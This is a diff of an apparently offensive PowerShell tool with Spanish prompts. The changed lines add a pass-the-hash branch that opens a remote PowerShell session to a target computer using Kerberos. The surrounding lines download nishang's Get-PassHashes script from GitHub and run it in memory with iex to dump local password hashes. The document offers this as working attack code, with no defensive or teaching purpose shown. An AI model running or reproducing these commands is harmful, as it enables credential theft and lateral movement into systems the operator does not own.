@@ -68,7 +68,7 @@ function ConvertFrom-SecureToPlain {
         if($hash -like 's*') { 
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
         Write-Host ""
-	$Host.UI.RawUI.ForegroundColor = 'Blue'
+	$Host.UI.RawUI.ForegroundColor = 'Yellow'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" -UseBasicParsing | iex
         Get-PassHashes 2> $null
         $Host.UI.RawUI.ForegroundColor = 'Gray'
@@ -128,7 +128,8 @@ function ConvertFrom-SecureToPlain {
       } until ($input -in '1','2','3','4')
 
 
-if(Test-Path variable:global:PassTheHash) { 2> $null } else { Write-Host ""
+if(Test-Path variable:global:PassTheHash) { Write-Host ""
+$RDP = New-PSSession -Computer $computer -Authentication Kerberos } else { Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
